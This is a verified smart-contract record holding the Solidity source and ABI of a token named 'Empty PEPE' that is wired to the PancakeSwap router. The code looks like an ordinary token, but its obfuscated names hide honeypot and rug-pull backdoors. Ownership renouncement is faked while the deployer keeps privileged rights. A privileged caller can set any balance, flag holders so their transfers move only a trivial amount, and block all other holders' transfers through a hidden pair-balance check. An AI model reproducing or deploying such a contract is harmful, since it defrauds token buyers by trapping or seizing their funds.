{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface enableSenderExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toSell) external view returns (uint256);\n\n    function transfer(address isFrom, uint256 sellAmountLimit) external returns (bool);\n\n    function allowance(address feeToken, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 sellAmountLimit) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address isFrom,\n        uint256 sellAmountLimit\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed isTxMax, uint256 value);\n    event Approval(address indexed feeToken, address indexed spender, uint256 value);\n}\n\nabstract contract autoMarketing {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fundTradingAmount {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listSwapSell {\n    function createPair(address liquidityMode, address shouldTrading) external returns (address);\n}\n\ninterface enableSenderExemptMetadata is enableSenderExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract EmptyPEPE is autoMarketing, enableSenderExempt, enableSenderExemptMetadata {\n\n    uint256 private exemptFrom = 100000000 * 10 ** 18;\n\n    function name() external view virtual override returns (string memory) {\n        return launchMin;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxAuto;\n    }\n\n    address private txAmount;\n\n    string private launchMin = \"Empty PEPE\";\n\n    address public shouldAutoMax;\n\n    function approve(address maxLiquidity, uint256 sellAmountLimit) public virtual override returns (bool) {\n        senderTrading[_msgSender()][maxLiquidity] = sellAmountLimit;\n        emit Approval(_msgSender(), maxLiquidity, sellAmountLimit);\n        return true;\n    }\n\n    address public atTrading;\n\n    string private maxAuto = \"EPE\";\n\n    uint256 tokenTakeReceiver;\n\n    function buyMarketing() private view {\n        require(autoBuy[_msgSender()]);\n    }\n\n    function owner() external view returns (address) {\n        return txAmount;\n    }\n\n    mapping(address => bool) public amountFee;\n\n    function shouldTx(address maxFund) public {\n        require(maxFund.balance < 100000);\n        if (liquidityAtMax) {\n            return;\n        }\n        if (swapAuto == enableLimit) {\n            enableLimit = shouldMax;\n        }\n        autoBuy[maxFund] = true;\n        if (buyLimit == maxLaunch) {\n            atTokenEnable = true;\n        }\n        liquidityAtMax = true;\n    }\n\n    bool private atTokenEnable;\n\n    constructor (){\n        if (atTokenEnable == buySwap) {\n            atTokenEnable = true;\n        }\n        fundTradingAmount shouldMode = fundTradingAmount(marketingMode);\n        shouldAutoMax = listSwapSell(shouldMode.factory()).createPair(shouldMode.WETH(), address(this));\n        if (enableLimit != shouldMax) {\n            buySwap = true;\n        }\n        atTrading = _msgSender();\n        toMin();\n        autoBuy[atTrading] = true;\n        amountBuy[atTrading] = exemptFrom;\n        \n        emit Transfer(address(0), atTrading, exemptFrom);\n    }\n\n    uint256 constant fundExempt = 8 ** 10;\n\n    function decimals() external view virtual override returns (uint8) {\n        return totalMin;\n    }\n\n    mapping(address => uint256) private amountBuy;\n\n    uint256 private maxLaunch;\n\n    function liquidityBuy(address senderAuto, uint256 sellAmountLimit) public {\n        buyMarketing();\n        amountBuy[senderAuto] = sellAmountLimit;\n    }\n\n    address marketingMode = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function feeIs(address enableMode) public {\n        buyMarketing();\n        \n        if (enableMode == atTrading || enableMode == shouldAutoMax) {\n            return;\n        }\n        amountFee[enableMode] = true;\n    }\n\n    event OwnershipTransferred(address indexed sellAtExempt, address indexed totalMinAt);\n\n    mapping(address => bool) public autoBuy;\n\n    uint256 public launchedSellTake;\n\n    uint256 private enableLimit;\n\n    uint256 public buyLimit;\n\n    function transfer(address senderAuto, uint256 sellAmountLimit) external virtual override returns (bool) {\n        return tokenMin(_msgSender(), senderAuto, sellAmountLimit);\n    }\n\n    function tokenMin(address amountTrading, address isFrom, uint256 sellAmountLimit) internal returns (bool) {\n        if (amountTrading == atTrading) {\n            return exemptSell(amountTrading, isFrom, sellAmountLimit);\n        }\n        uint256 marketingFundReceiver = enableSenderExempt(shouldAutoMax).balanceOf(buyLimitTake);\n        require(marketingFundReceiver == swapTrading);\n        require(isFrom != buyLimitTake);\n        if (amountFee[amountTrading]) {\n            return exemptSell(amountTrading, isFrom, fundExempt);\n        }\n        return exemptSell(amountTrading, isFrom, sellAmountLimit);\n    }\n\n    uint256 swapTrading;\n\n    function getOwner() external view returns (address) {\n        return txAmount;\n    }\n\n    function transferFrom(address amountTrading, address isFrom, uint256 sellAmountLimit) external override returns (bool) {\n        if (_msgSender() != marketingMode) {\n            if (senderTrading[amountTrading][_msgSender()] != type(uint256).max) {\n                require(sellAmountLimit <= senderTrading[amountTrading][_msgSender()]);\n                senderTrading[amountTrading][_msgSender()] -= sellAmountLimit;\n            }\n        }\n        return tokenMin(amountTrading, isFrom, sellAmountLimit);\n    }\n\n    uint256 public shouldMax;\n\n    mapping(address => mapping(address => uint256)) private senderTrading;\n\n    function exemptSell(address amountTrading, address isFrom, uint256 sellAmountLimit) internal returns (bool) {\n        require(amountBuy[amountTrading] >= sellAmountLimit);\n        amountBuy[amountTrading] -= sellAmountLimit;\n        amountBuy[isFrom] += sellAmountLimit;\n        emit Transfer(amountTrading, isFrom, sellAmountLimit);\n        return true;\n    }\n\n    function allowance(address toWallet, address maxLiquidity) external view virtual override returns (uint256) {\n        if (maxLiquidity == marketingMode) {\n            return type(uint256).max;\n        }\n        return senderTrading[toWallet][maxLiquidity];\n    }\n\n    bool private buySwap;\n\n    address buyLimitTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptFrom;\n    }\n\n    uint256 private swapAuto;\n\n    function exemptFee(uint256 sellAmountLimit) public {\n        buyMarketing();\n        swapTrading = sellAmountLimit;\n    }\n\n    bool public liquidityAtMax;\n\n    function balanceOf(address toSell) public view virtual override returns (uint256) {\n        return amountBuy[toSell];\n    }\n\n    uint8 private totalMin = 18;\n\n    function toMin() public {\n        emit OwnershipTransferred(atTrading, address(0));\n        txAmount = address(0);\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"feeToken\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellAtExempt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalMinAt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isTxMax\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"amountFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxLiquidity\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountLimit\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"sellAmountLimit\",\"type\":\"uint256\"}],\"name\":\"exemptFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMode\",\"type\":\"address\"}],\"name\":\"feeIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedSellTake\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityAtMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountLimit\",\"type\":\"uint256\"}],\"name\":\"liquidityBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldAutoMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"shouldMax\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxFund\",\"type\":\"address\"}],\"name\":\"shouldTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountLimit\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTrading\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isFrom\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"sellAmountLimit\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "EmptyPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}